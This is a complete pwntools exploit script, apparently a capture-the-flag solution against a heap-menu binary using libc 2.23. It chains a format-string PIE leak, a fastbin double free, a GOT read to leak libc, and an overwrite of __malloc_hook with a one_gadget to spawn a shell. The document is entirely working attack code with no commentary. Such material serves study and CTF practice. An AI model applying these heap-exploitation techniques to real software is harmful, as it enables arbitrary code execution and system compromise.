from pwn import*
def add(sizeI,sizeII,contentI,contentII):
	p.sendlineafter('do :','1')
	p.sendlineafter('length : ',str(sizeI))
	p.sendafter('O : ',contentI)
	p.sendlineafter('length : ',str(sizeII))
	p.sendafter('RE : ',contentII)
def edit(index,contentI,contentII):
	p.sendlineafter('do :','2')
	p.sendlineafter('ID : ',str(index))
	p.sendafter('O : ',contentI)
	p.sendafter('RE : ',contentII)
def free(index):
	p.sendlineafter('do :','3')
	p.sendlineafter('ID : ',str(index))
def show(index):
	p.sendlineafter('do :','4')
	p.sendlineafter('ID : ',str(index))
p = process('./interested')
elf = ELF('./interested',checksec=False)
libc = ELF('libc-2.23.so',checksec=False)
context.log_level =='debug'
p.sendafter('please:','OreOOrereOOreO%14$p')
p.sendlineafter('do :','0')
p.recvuntil('OreOOrereOOreO')
pie = int(p.recv(14),16) - 0x202050
add(0x60,0x70,'I','I')
add(0x60,0x70,'II','II')
free(1)
free(2)
free(1)
'''
Fastbins
[0x70] 1 ->2 -> 1
[0x80] 1 ->2 -> 1
'''
add(0x60,0x30,p64(pie+0x202080),'I')
add(0x60,0x30,'II','II')
add(0x60,0x30,'I','I')
payload = p64(0x70)*3 + p64(0)*8 + p64(pie+0x2020E8)
add(0x60,0x30,payload,'III')
edit(1,p64(pie+0x2020E8)+p64(elf.got['puts'] + pie),'I')
show(2)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['puts']
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
og = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = libc_base + og[3]
edit(1,p64(pie+0x2020E8) + p64(malloc_hook),'I')
edit(2,p64(one_gadget),'II')
p.sendlineafter('do :','1')
p.sendlineafter('length : ','32')
p.interactive()
